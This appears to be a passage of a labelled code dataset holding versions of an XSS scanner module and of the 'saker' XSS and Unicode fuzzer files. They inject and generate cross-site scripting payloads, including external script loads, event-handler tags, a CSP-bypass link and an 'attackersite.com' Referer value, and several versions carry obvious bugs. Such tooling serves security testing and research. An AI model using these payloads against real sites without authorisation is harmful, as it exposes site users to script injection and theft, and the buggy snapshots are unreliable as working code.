    if method == 'POST' or method == 'PUT':
        xss_post_method(url,method,headers,body,scanid)

    xss_http_headers(url,method,headers,body,scanid)/n/n/n",1
18,5f6fdd0979f8a999cc9cac3ea7aa1fbe2c7d8c3c,"modules/xss.py/n/nimport os
import urlparse
import sendrequest as req
import utils.logs as logs
import urlparse
import time
import urllib

from utils.logger import logger
from utils.db import Database_update
from utils.config import get_value

dbupdate = Database_update()
api_logger = logger()

def fetch_xss_payload():
    # Returns xss payloads in list type
    payload_list = []
    if os.getcwd().split('/')[-1] == 'API':
        path = '../Payloads/xss.txt'
    else:
        path = 'Payloads/xss.txt'

    with open(path) as f:
        for line in f:
            if line:
                payload_list.append(line.rstrip())

    return payload_list

def check_xss_impact(res_headers):
    # Return the impact of XSS based on content-type header
    print ""response header"",res_headers['Content-Type']
    if res_headers['Content-Type']:
        if res_headers['Content-Type'].find('application/json') != -1 or res_headers['Content-Type'].find('text/plain') != -1:
            # Possible XSS 
            impact = ""Low""
        else:
            impact = ""High""
    else:
        impact = ""Low""

    return impact


def xss_payload_decode(payload):
    # Return decoded payload of XSS. 
    decoded_payload = urllib.unquote(payload).decode('utf8').encode('ascii','ignore')
    return decoded_payload

def xss_post_method(url,method,headers,body,scanid=None):
    # This function checks XSS through POST method.
    print url, headers,method,body
    temp_body = {}
    post_vul_param = ''
    for key,value in body.items():
        xss_payloads = fetch_xss_payload()
        for payload in xss_payloads:
            temp_body.update(body)
            temp_body[key] = payload
            print ""updated body"",temp_body
            xss_post_request = req.api_request(url, ""POST"", headers, temp_body)
            decoded_payload = xss_payload_decode(payload)
            if xss_post_request.text.find(decoded_payload) != -1:
                impact = check_xss_impact(xss_post_request.headers)
                if db_update is not True:
                    attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : xss_url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request.headers ,""res_body"": xss_request.text}
                    dbupdate.insert_record(attack_result)
                    db_update = True
                    vul_param += key
                else:
                    result = True
                    if vul_param == '':
                        post_vul_param += key
                    else:
                        post_vul_param += ','+key 

    if post_vul_param:
        dbupdate.update_record({""scanid"": scanid}, {""$set"" : {""scan_data"" : post_vul_param+"" are vulnerable to XSS""}})


def xss_http_headers(url,method,headers,body,scanid=None):
    # This function checks different header based XSS.
    # XSS via Host header (Limited to IE)
    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/
    temp_headers = {}
    temp_headers.update(headers)
    xss_payloads = fetch_xss_payload()
    for payload in xss_payloads:
        parse_domain = urlparse.urlparse(url).netloc
        host_header = {""Host"" : parse_domain + '/' + payload}
        headers.update(host_header)
        host_header_xss = req.api_request(url, ""GET"", headers)
        decoded_payload = xss_payload_decode(payload)
        if host_header_xss.text.find(decoded_payload) != -1:
            impact = ""Low""
            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": host_header_xss.headers ,""res_body"": host_header_xss.text}
            dbupdate.insert_record(attack_result)
            break

    # Test for Referer based XSS 
    for payload in xss_payloads:
        referer_header_value = 'https://github.com?test='+payload
        referer_header = {""Referer"" : referer_header_value}
        temp_headers.update(referer_header)
        ref_header_xss = req.api_request(url, ""GET"", temp_headers)
        decoded_payload = xss_payload_decode(payload)
        if ref_header_xss.text.find(decoded_payload) != -1:
            print ref_header_xss.text
            impact = check_xss_impact(temp_headers)
            print ""%s[{0}] {1} is vulnerable to XSS via referer header%s"".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting via referer header"", ""impact"": impact, ""req_headers"": temp_headers, ""req_body"":body, ""res_headers"": ref_header_xss.headers ,""res_body"": ref_header_xss.text}
            dbupdate.insert_record(attack_result)
            return


def xss_get_url(url,method,headers,body,scanid=None):
    # Check for URL based XSS. 
    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>
    result = ''
    xss_payloads = fetch_xss_payload()
    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']
    for uri_list in uri_check_list:
        if uri_list in url:
            # Parse domain name from URI.
            parsed_url = urlparse.urlparse(url).scheme+""://""+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path
            break

    if parsed_url == '':
        parsed_url = url

    for payload in xss_payloads:
        xss_request_url = req.api_request(parsed_url+'/'+payload,""GET"",headers)
        if result is not True:
            decoded_payload = xss_payload_decode(payload)
            if xss_request_url.text.find(decoded_payload) != -1:
                impact = check_xss_impact(xss_request_url.headers)
                attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request_url.headers ,""res_body"": xss_request_url.text}
                dbupdate.insert_record(attack_result)
                result = True

        xss_request_uri = req.api_request(parsed_url+'/?test='+payload,""GET"",headers)             
        if xss_request_url.text.find(decoded_payload) != -1:
            impact = check_xss_impact(xss_request_uri.headers)
            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request_url.headers ,""res_body"": xss_request_url.text}
            dbupdate.insert_record(attack_result)
                

def xss_get_uri(url,method,headers,body,scanid=None):
    # This function checks for URI based XSS. 
    # http://localhost/?firstname=<payload>&lastname=<payload>
    db_update = ''
    vul_param = ''
    url_query = urlparse.urlparse(url)
    parsed_query = urlparse.parse_qs(url_query.query)
    if parsed_query:
        for key,value in parsed_query.items():
            try:
                result = ''
                logs.logging.info(""GET param for xss : %s"",key)
                xss_payloads = fetch_xss_payload()
                for payload in xss_payloads:
                    # check for URI based XSS
                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>
                    if result is not True:
                        parsed_url = urlparse.urlparse(url)
                        xss_url = parsed_url.scheme+""://""+parsed_url.netloc+parsed_url.path+""/?""+parsed_url.query.replace(value[0], payload)
                        xss_request = req.api_request(xss_url,""GET"",headers)
                        decoded_payload = xss_payload_decode(payload)
                        print decoded_payload
                        print xss_url
                        if xss_request.text.find(decoded_payload) != -1:
                            impact = check_xss_impact(xss_request.headers)
                            logs.logging.info(""%s is vulnerable to XSS"",url)
                            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
                            if db_update is not True:
                                attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : xss_url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request.headers ,""res_body"": xss_request.text}
                                dbupdate.insert_record(attack_result)
                                result,db_update = True,True
                                vul_param += key
                            else:
                                result = True
                                if vul_param == '':
                                    vul_param += key
                                else:
                                    vul_param += ','+key                  
        
            except:
                logs.logging.info(""XSS: No GET param found!"")

        if vul_param:
            # Update all vulnerable params to db.
            print vul_param,scanid
            dbupdate.update_record({""scanid"": scanid}, {""$set"" : {""scan_data"" : vul_param+"" parameters are vulnerable to XSS""}})


def xss_check(url,method,headers,body,scanid):
    # Main function for XSS attack
    if method == 'GET' or method == 'DEL':
        xss_get_uri(url,method,headers,body,scanid)
        xss_get_url(url,method,headers,body,scanid)

    if method == 'POST' or method == 'PUT':
        xss_post_method(url,method,headers,body,scanid)

    xss_http_headers(url,method,headers,body,scanid)/n/n/n",0
19,5f6fdd0979f8a999cc9cac3ea7aa1fbe2c7d8c3c,"/modules/xss.py/n/nimport os
import urlparse
import sendrequest as req
import utils.logs as logs
import urlparse
import time
import urllib

from utils.logger import logger
from utils.db import Database_update
from utils.config import get_value

dbupdate = Database_update()
api_logger = logger()

def fetch_xss_payload():
    # Returns xss payloads in list type
    payload_list = []
    if os.getcwd().split('/')[-1] == 'API':
        path = '../Payloads/xss.txt'
    else:
        path = 'Payloads/xss.txt'

    with open(path) as f:
        for line in f:
            if line:
                payload_list.append(line.rstrip())

    return payload_list

def check_xss_impact(res_headers):
    # Return the impact of XSS based on content-type header
    print ""response header"",res_headers['Content-Type']
    if res_headers['Content-Type']:
        if res_headers['Content-Type'].find('application/json') != -1 or res_headers['Content-Type'].find('text/plain') != -1:
            # Possible XSS 
            impact = ""Low""
        else:
            impact = ""High""
    else:
        impact = ""Low""

    return impact


def xss_payload_decode(payload):
    # Return decoded payload of XSS. 
    decoded_payload = urllib.unquote(payload).decode('utf8').encode('ascii','ignore')
    return decoded_payload

def xss_post_method(url,method,headers,body,scanid=None):
    # This function checks XSS through POST method.
    print url, headers,method,body
    temp_body = {}
    post_vul_param = ''
    for key,value in body.items():
        xss_payloads = fetch_xss_payload()
        for payload in xss_payloads:
            temp_body.update(body)
            temp_body[key] = payload
            print ""updated body"",temp_body
            xss_post_request = req.api_request(url, ""POST"", headers, temp_body)
            decoded_payload = xss_payload_decode(payload)
            if xss_post_request.text.find(decoded_payload) != -1:
                impact = check_xss_impact(xss_post_request.headers)
                if db_update is not True:
                    attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : xss_url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request.headers ,""res_body"": xss_request.text}
                    dbupdate.insert_record(attack_result)
                    db_update = True
                    vul_param += key
                else:
                    result = True
                    if vul_param == '':
                        post_vul_param += key
                    else:
                        post_vul_param += ','+key 

    if post_vul_param:
        dbupdate.update_record({""scanid"": scanid}, {""$set"" : {""scan_data"" : post_vul_param+"" are vulnerable to XSS""}})


def xss_http_headers(url,method,headers,body,scanid=None):
    # This function checks different header based XSS.
    # XSS via Host header (Limited to IE)
    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/
    temp_headers = {}
    temp_headers.update(headers)
    xss_payloads = fetch_xss_payload()
    for payload in xss_payloads:
        parse_domain = urlparse.urlparse(url).netloc
        host_header = {""Host"" : parse_domain + '/' + payload}
        headers.update(host_header)
        host_header_xss = req.api_request(url, ""GET"", headers)
        decoded_payload = xss_payload_decode(payload)
        if host_header_xss.text.find(decoded_payload) != -1:
            impact = ""Low""
            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": host_header_xss.headers ,""res_body"": host_header_xss.text}
            dbupdate.insert_record(attack_result)
            break

    # Test for Referer based XSS 
    for payload in xss_payloads:
        referer_header_value = 'http://attackersite.com?test='+payload
        referer_header = {""Referer"" : referer_header_value}
        temp_headers.update(referer_header)
        ref_header_xss = req.api_request(url, ""GET"", temp_headers)
        decoded_payload = xss_payload_decode(payload)
        if ref_header_xss.text.find(decoded_payload) != -1:
            print ref_header_xss.text
            impact = check_xss_impact(temp_headers)
            print ""%s[{0}] {1} is vulnerable to XSS via referer header%s"".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting via referer header"", ""impact"": impact, ""req_headers"": temp_headers, ""req_body"":body, ""res_headers"": ref_header_xss.headers ,""res_body"": ref_header_xss.text}
            dbupdate.insert_record(attack_result)
            return


def xss_get_url(url,method,headers,body,scanid=None):
    # Check for URL based XSS. 
    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>
    result = ''
    xss_payloads = fetch_xss_payload()
    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']
    for uri_list in uri_check_list:
        if uri_list in url:
            # Parse domain name from URI.
            parsed_url = urlparse.urlparse(url).scheme+""://""+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path
            break

    if parsed_url == '':
        parsed_url = url

    for payload in xss_payloads:
        xss_request_url = req.api_request(parsed_url+'/'+payload,""GET"",headers)
        if result is not True:
            decoded_payload = xss_payload_decode(payload)
            if xss_request_url.text.find(decoded_payload) != -1:
                impact = check_xss_impact(xss_request_url.headers)
                attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request_url.headers ,""res_body"": xss_request_url.text}
                dbupdate.insert_record(attack_result)
                result = True

        xss_request_uri = req.api_request(parsed_url+'/?test='+payload,""GET"",headers)             
        if xss_request_url.text.find(decoded_payload) != -1:
            impact = check_xss_impact(xss_request_uri.headers)
            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request_url.headers ,""res_body"": xss_request_url.text}
            dbupdate.insert_record(attack_result)
                

def xss_get_uri(url,method,headers,body,scanid=None):
    # This function checks for URI based XSS. 
    # http://localhost/?firstname=<payload>&lastname=<payload>
    db_update = ''
    vul_param = ''
    url_query = urlparse.urlparse(url)
    parsed_query = urlparse.parse_qs(url_query.query)
    if parsed_query:
        for key,value in parsed_query.items():
            try:
                result = ''
                logs.logging.info(""GET param for xss : %s"",key)
                xss_payloads = fetch_xss_payload()
                for payload in xss_payloads:
                    # check for URI based XSS
                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>
                    if result is not True:
                        parsed_url = urlparse.urlparse(url)
                        xss_url = parsed_url.scheme+""://""+parsed_url.netloc+parsed_url.path+""/?""+parsed_url.query.replace(value[0], payload)
                        xss_request = req.api_request(xss_url,""GET"",headers)
                        decoded_payload = xss_payload_decode(payload)
                        print decoded_payload
                        print xss_url
                        if xss_request.text.find(decoded_payload) != -1:
                            impact = check_xss_impact(xss_request.headers)
                            logs.logging.info(""%s is vulnerable to XSS"",url)
                            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
                            if db_update is not True:
                                attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : xss_url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request.headers ,""res_body"": xss_request.text}
                                dbupdate.insert_record(attack_result)
                                result,db_update = True,True
                                vul_param += key
                            else:
                                result = True
                                if vul_param == '':
                                    vul_param += key
                                else:
                                    vul_param += ','+key                  
        
            except:
                logs.logging.info(""XSS: No GET param found!"")

        if vul_param:
            # Update all vulnerable params to db.
            print vul_param,scanid
            dbupdate.update_record({""scanid"": scanid}, {""$set"" : {""scan_data"" : vul_param+"" parameters are vulnerable to XSS""}})


def xss_check(url,method,headers,body,scanid):
    # Main function for XSS attack
    if method == 'GET' or method == 'DEL':
        xss_get_uri(url,method,headers,body,scanid)
        xss_get_url(url,method,headers,body,scanid)

    if method == 'POST' or method == 'PUT':
        xss_post_method(url,method,headers,body,scanid)

    xss_http_headers(url,method,headers,body,scanid)/n/n/n",1
20,bc18f1148918f6cef38f2d7f575482dc43575b7b,"saker/fuzzers/xss.py/n/n#!/usr/bin/env python
# -*- coding: utf-8 -*-

from saker.fuzzers.fuzzer import Fuzzer


class XSS(Fuzzer):

    """"""generate XSS payload""""""

    def __init__(self, url=""""):
        """"""
        url: xss payload url
        """"""
        super(XSS, self).__init__()
        self.url = url

    @staticmethod
    def alterTest(self, p=False):
        return ""<script>alert(/xss/)</script>""

    def img(self):
        return '<img/onerror=""%s""/src=x>' % payload

    def svg(self, payload):
        return '<svg/onload=""%s""/>' % payload

    def style(self, payload):
        return '<style/onload=""%s""></style>' % payload

    def input(self, payload):
        return '<input/onfocus=""%s""/autofocus>' % payload

    def marquee(self, payload):
        return '<marquee/onstart=""%s""></marquee>' % payload

    def div(self, payload):
        return '<div/onwheel=""%s""/style=""height:200%;width:100%""></div>' % payload

    def script(self):
        payload = ""<script src='%s'></script>"" % self.url
        return payload

    def event(self, element, src, event, js):
        payload = ""<%s src="" % element
        payload += '""%s"" ' % src
        payload += event
        payload += ""=%s >"" % js
        return payload

    def cspBypass(self):
        return ""<link rel='preload' href='%s'>"" % self.url
/n/n/n",0
21,bc18f1148918f6cef38f2d7f575482dc43575b7b,"/saker/fuzzers/xss.py/n/n#!/usr/bin/env python
# -*- coding: utf-8 -*-

from saker.fuzzers.fuzzer import Fuzzer


class XSS(Fuzzer):

    """"""generate XSS payload""""""

    def __init__(self, url=""""):
        """"""
        url: xss payload url
        """"""
        super(XSS, self).__init__()
        self.url = url

    @staticmethod
    def alterTest(self, p=False):
        return ""<script>alert(/xss/)</script>""

    def img(self):
        payload = ""<img src='%s'></img>"" % self.url
        return payload

    def script(self):
        payload = ""<script src='%s'></script>"" % self.url
        return payload

    def event(self, element, src, event, js):
        payload = ""<%s src="" % element
        payload += '""%s"" ' % src
        payload += event
        payload += ""=%s >"" % js
        return payload

    def cspBypass(self):
        return ""<link rel='preload' href='%s'>"" % self.url
/n/n/n",1
22,47abf048e510b5be0118d7fc390d0f0202040bca,"saker/fuzzers/xss.py/n/n#!/usr/bin/env python
# -*- coding: utf-8 -*-

from saker.fuzzers.fuzzer import Fuzzer

_tags = [
    'a',
    'abbr',
    'acronym',
    'address',
    'applet',
    'area',
    'article',
    'aside',
    'audio',
    'b',
    'base',
    'basefont',
    'bdi',
    'bdo',
    'bgsound',
    'big',
    'blink',
    'blockquote',
    'body',
    'br',
    'button',
    'canvas',
    'caption',
    'center',
    'cite',
    'code',
    'col',
    'colgroup',
    'command',
    'content',
    'data',
    'datalist',
    'dd',
    'del',
    'details',
    'dfn',
    'dialog',
    'dir',
    'div',
    'dl',
    'dt',
    'element',
    'em',
    'embed',
    'fieldset',
    'figcaption',
    'figure',
    'font',
    'footer',
    'form',
    'frame',
    'frameset',
    'h1',
    'h2',
    'h3',
    'h4',
    'h5',
    'h6',
    'head',
    'header',
    'hgroup',
    'hr',
    'html',
    'i',
    'iframe',
    'image',
    'img',
    'input',
    'ins',
    'isindex',
    'kbd',
    'keygen',
    'label',
    'layer',
    'legend',
    'li',
    'link',
    'listing',
    'main',
    'map',
    'mark',
    'marquee',
    'menu',
    'menuitem',
    'meta',
    'meter',
    'multicol',
    'nav',
    'nobr',
    'noembed',
    'noframes',
    'nolayer',
    'noscript',
    'object',
    'ol',
    'optgroup',
    'option',
    'output',
    'p',
    'param',
    'picture',
    # 'plaintext',
    'pre',
    'progress',
    'q',
    'rp',
    'rt',
    'rtc',
    'ruby',
    's',
    'samp',
    'script',
    'section',
    'select',
    'shadow',
    'small',
    'source',
    'spacer',
    'span',
    'strike',
    'strong',
    'style',
    'sub',
    'summary',
    'sup',
    'table',
    'tbody',
    'td',
    'template',
    'textarea',
    'tfoot',
    'th',
    'thead',
    'time',
    'title',
    'tr',
    'track',
    'tt',
    'u',
    'ul',
    'var',
    'video',
    'wbr',
    'xmp',
]

_events = [
    'onabort',
    'onautocomplete',
    'onautocompleteerror',
    'onafterscriptexecute',
    'onanimationend',
    'onanimationiteration',
    'onanimationstart',
    'onbeforecopy',
    'onbeforecut',
    'onbeforeload',
    'onbeforepaste',
    'onbeforescriptexecute',
    'onbeforeunload',
    'onbegin',
    'onblur',
    'oncanplay',
    'oncanplaythrough',
    'onchange',
    'onclick',
    'oncontextmenu',
    'oncopy',
    'oncut',
    'ondblclick',
    'ondrag',
    'ondragend',
    'ondragenter',
    'ondragleave',
    'ondragover',
    'ondragstart',
    'ondrop',
    'ondurationchange',
    'onend',
    'onemptied',
    'onended',
    'onerror',
    'onfocus',
    'onfocusin',
    'onfocusout',
    'onhashchange',
    'oninput',
    'oninvalid',
    'onkeydown',
    'onkeypress',
    'onkeyup',
    'onload',
    'onloadeddata',
    'onloadedmetadata',
    'onloadstart',
    'onmessage',
    'onmousedown',
    'onmouseenter',
    'onmouseleave',
    'onmousemove',
    'onmouseout',
    'onmouseover',
    'onmouseup',
    'onmousewheel',
    'onoffline',
    'ononline',
    'onorientationchange',
    'onpagehide',
    'onpageshow',
    'onpaste',
    'onpause',
    'onplay',
    'onplaying',
    'onpopstate',
    'onprogress',
    'onratechange',
    'onreset',
    'onresize',
    'onscroll',
    'onsearch',
    'onseeked',
    'onseeking',
    'onselect',
    'onselectionchange',
    'onselectstart',
    'onstalled',
    'onstorage',
    'onsubmit',
    'onsuspend',
    'ontimeupdate',
    'ontoggle',
    'ontouchcancel',
    'ontouchend',
    'ontouchmove',
    'ontouchstart',
    'ontransitionend',
    'onunload',
    'onvolumechange',
    'onwaiting',
    'onwebkitanimationend',
    'onwebkitanimationiteration',
    'onwebkitanimationstart',
    'onwebkitfullscreenchange',
    'onwebkitfullscreenerror',
    'onwebkitkeyadded',
    'onwebkitkeyerror',
    'onwebkitkeymessage',
    'onwebkitneedkey',
    'onwebkitsourceclose',
    'onwebkitsourceended',
    'onwebkitsourceopen',
    'onwebkitspeechchange',
    'onwebkittransitionend',
    'onwheel'
]

_htmlTemplate = '''
<!DOCTYPE html>
<html>
<head>
    <title>XSS Fuzzer</title>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"" />
</head>
<body>
%s
</body>
</html>
'''


class XSS(Fuzzer):

    """"""generate XSS payload""""""

    tags = _tags
    events = _events
    htmlTemplate = _htmlTemplate

    def __init__(self, url=""""):
        """"""
        url: xss payload url
        """"""
        super(XSS, self).__init__()
        self.url = url

    @classmethod
    def alterTest(cls, p=False):
        return ""<script>alert(/xss/)</script>""

    @classmethod
    def genTestHTML(cls):
        s = ''
        for t in cls.tags:
            s += '<%s src=""x""' % t
            for e in cls.events:
                s += ''' %s=""console.log('%s %s')"" ''' % (e, t, e)
            s += '>%s</%s>\n' % (t, t)
        return cls.htmlTemplate % s

    def img(self, payload):
        return '<img/onerror=""%s""/src=x>' % payload

    def svg(self, payload):
        return '<svg/onload=""%s""/>' % payload

    def style(self, payload):
        return '<style/onload=""%s""></style>' % payload

    def input(self, payload):
        return '<input/onfocus=""%s""/autofocus>' % payload

    def marquee(self, payload):
        return '<marquee/onstart=""%s""></marquee>' % payload

    def div(self, payload):
        return '<div/onwheel=""%s""/style=""height:200%;width:100%""></div>' % payload

    def script(self):
        payload = ""<script src='%s'></script>"" % self.url
        return payload

    def event(self, element, src, event, js):
        payload = ""<%s src="" % element
        payload += '""%s"" ' % src
        payload += event
        payload += ""=%s >"" % js
        return payload

    def cspBypass(self):
        return ""<link rel='preload' href='%s'>"" % self.url
/n/n/n",0
23,47abf048e510b5be0118d7fc390d0f0202040bca,"/saker/fuzzers/xss.py/n/n#!/usr/bin/env python
# -*- coding: utf-8 -*-

from saker.fuzzers.fuzzer import Fuzzer


class XSS(Fuzzer):

    """"""generate XSS payload""""""

    def __init__(self, url=""""):
        """"""
        url: xss payload url
        """"""
        super(XSS, self).__init__()
        self.url = url

    @staticmethod
    def alterTest(self, p=False):
        return ""<script>alert(/xss/)</script>""

    def img(self):
        return '<img/onerror=""%s""/src=x>' % payload

    def svg(self, payload):
        return '<svg/onload=""%s""/>' % payload

    def style(self, payload):
        return '<style/onload=""%s""></style>' % payload

    def input(self, payload):
        return '<input/onfocus=""%s""/autofocus>' % payload

    def marquee(self, payload):
        return '<marquee/onstart=""%s""></marquee>' % payload

    def div(self, payload):
        return '<div/onwheel=""%s""/style=""height:200%;width:100%""></div>' % payload

    def script(self):
        payload = ""<script src='%s'></script>"" % self.url
        return payload

    def event(self, element, src, event, js):
        payload = ""<%s src="" % element
        payload += '""%s"" ' % src
        payload += event
        payload += ""=%s >"" % js
        return payload

    def cspBypass(self):
        return ""<link rel='preload' href='%s'>"" % self.url
/n/n/n",1
24,41edd3db5be87f860c0c37199de9b55596b704da,"saker/fuzzers/code.py/n/n#!/usr/bin/env python
# -*- coding: utf-8 -*-

import random
import string
from urllib.parse import quote
from unicodedata import normalize
from saker.fuzzers.fuzzer import Fuzzer


class Code(Fuzzer):

    """"""Code Payload""""""

    homograph = {
        'a': '\u0430',
        'c': '\u03F2',
        'd': '\u0501',
        'e': '\u0435',
        'h': '\u04BB',
        'i': '\u0456',
        'j': '\u0458',
        'l': '\u04CF',
        'o': '\u043E',
        'p': '\u0440',
        'r': '\u0433',
        'q': '\u051B',
        's': '\u0455',
        'w': '\u051D',
        'x': '\u0445',
        'y': '\u0443',
    }

    def __init__(self):
        super(Code, self).__init__()

    @staticmethod
    def fuzzAscii():
        for i in xrange(256):
            yield chr(i)

    @staticmethod
    def fuzzUnicode(cnt=1):
        for i in xrange(cnt):
            yield unichr(random.randint(0, 0xffff))

    @staticmethod
    def fuzzUnicodeReplace(s, cnt=1):
        # Greek letter
        s = s.replace(""A"", """", cnt)
        s = s.replace(""A"", """", cnt)
        s = s.replace(""A"", """", cnt)
        s = s.replace(""a"", """", cnt)
        # Russian letter 1-4
        s = s.replace(""e"", """", cnt)
        s = s.replace(""a"", """", cnt)
        s = s.replace(""e"", """", cnt)
        s = s.replace(""o"", """", cnt)
        return s

    @staticmethod
    def fuzzErrorUnicode(s):
        # https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html
        return s + chr(random.randint(0xC2, 0xef))

    @staticmethod
    def urlencode(s, force=False):
        if not force:
            s = quote(s)
        else:
            s = map(lambda i: hex(ord(i)).replace(""0x"", ""%""), s)
            s = """".join(s)
        return s

    @staticmethod
    def findUpper(dst):
        return list(filter(lambda i: i.upper() == dst, map(chr, range(1, 0x10000))))

    @staticmethod
    def findLower(dst):
        return list(filter(lambda i: i.lower() == dst, map(chr, range(1, 0x10000))))

    @staticmethod
    def findNormalize(dst, form='NFKC'):
        # form should in ['NFC', 'NFKC', 'NFD', 'NFKD']
        return list(filter(lambda i: normalize(form, i)[0] == dst, map(chr, range(1, 0x10000))))
/n/n/nsaker/fuzzers/xss.py/n/n#!/usr/bin/env python
# -*- coding: utf-8 -*-

from saker.fuzzers.fuzzer import Fuzzer

_tags = [
    'a',
    'abbr',
    'acronym',
    'address',
    'applet',
    'area',
    'article',
    'aside',
    'audio',
    'b',
    'base',
    'basefont',
    'bdi',
    'bdo',
    'bgsound',
    'big',
    'blink',
    'blockquote',
    'body',
    'br',
    'button',
    'canvas',
    'caption',
    'center',
    'cite',
    'code',
    'col',
    'colgroup',
    'command',
    'content',
    'data',
    'datalist',
    'dd',
    'del',
    'details',
    'dfn',
    'dialog',
    'dir',
    'div',
    'dl',
    'dt',
    'element',
    'em',
    'embed',
    'fieldset',
    'figcaption',
    'figure',
    'font',
    'footer',
    'form',
    'frame',
    'frameset',
    'h1',
    'h2',
    'h3',
    'h4',
    'h5',
    'h6',
    'head',
    'header',
    'hgroup',
    'hr',
    'html',
    'i',
    'iframe',
    'image',
    'img',
    'input',
    'ins',
    'isindex',
    'kbd',
    'keygen',
    'label',
    'layer',
    'legend',
    'li',
    'link',
    'listing',
    'main',
    'map',
    'mark',
    'marquee',
    'menu',
    'menuitem',
    'meta',
    'meter',
    'multicol',
    'nav',
    'nobr',
    'noembed',
    'noframes',
    'nolayer',
    'noscript',
    'object',
    'ol',
    'optgroup',
    'option',
    'output',
    'p',
    'param',
    'picture',
    # 'plaintext',
    'pre',
    'progress',
    'q',
    'rp',
    'rt',
    'rtc',
    'ruby',
    's',
    'samp',
    'script',
    'section',
    'select',
    'shadow',
    'small',
    'source',
    'spacer',
    'span',
    'strike',
    'strong',
    'style',
    'sub',
    'summary',
    'sup',
    'table',
    'tbody',
    'td',
    'template',
    'textarea',
    'tfoot',
    'th',
    'thead',
    'time',
    'title',
    'tr',
    'track',
    'tt',
    'u',
    'ul',
    'var',
    'video',
    'wbr',
    'xmp',
]

_events = [
    'onabort',
    'onautocomplete',
    'onautocompleteerror',
    'onafterscriptexecute',
    'onanimationend',
    'onanimationiteration',
    'onanimationstart',
    'onbeforecopy',
    'onbeforecut',
    'onbeforeload',
    'onbeforepaste',
    'onbeforescriptexecute',
    'onbeforeunload',
    'onbegin',
    'onblur',
    'oncanplay',
    'oncanplaythrough',
    'onchange',
    'onclick',
    'oncontextmenu',
    'oncopy',
    'oncut',
    'ondblclick',
    'ondrag',
    'ondragend',
    'ondragenter',
    'ondragleave',
    'ondragover',
    'ondragstart',
    'ondrop',
    'ondurationchange',
    'onend',
    'onemptied',
    'onended',
    'onerror',
    'onfocus',
    'onfocusin',
    'onfocusout',
    'onhashchange',
    'oninput',
    'oninvalid',
    'onkeydown',
    'onkeypress',
    'onkeyup',
    'onload',
    'onloadeddata',
    'onloadedmetadata',
    'onloadstart',
    'onmessage',
    'onmousedown',
    'onmouseenter',
    'onmouseleave',
    'onmousemove',
    'onmouseout',
    'onmouseover',
    'onmouseup',
    'onmousewheel',
    'onoffline',
    'ononline',
    'onorientationchange',
    'onpagehide',
    'onpageshow',
    'onpaste',
    'onpause',
    'onplay',
    'onplaying',
    'onpopstate',
    'onprogress',
    'onratechange',
    'onreset',
    'onresize',
    'onscroll',
    'onsearch',
    'onseeked',
    'onseeking',
    'onselect',
    'onselectionchange',
    'onselectstart',
    'onstalled',
    'onstorage',
    'onsubmit',
    'onsuspend',
    'ontimeupdate',
    'ontoggle',
    'ontouchcancel',
    'ontouchend',
    'ontouchmove',
    'ontouchstart',
    'ontransitionend',
    'onunload',
    'onvolumechange',
    'onwaiting',
    'onwebkitanimationend',
    'onwebkitanimationiteration',
    'onwebkitanimationstart',
    'onwebkitfullscreenchange',
    'onwebkitfullscreenerror',
    'onwebkitkeyadded',
    'onwebkitkeyerror',
    'onwebkitkeymessage',
    'onwebkitneedkey',
    'onwebkitsourceclose',
    'onwebkitsourceended',
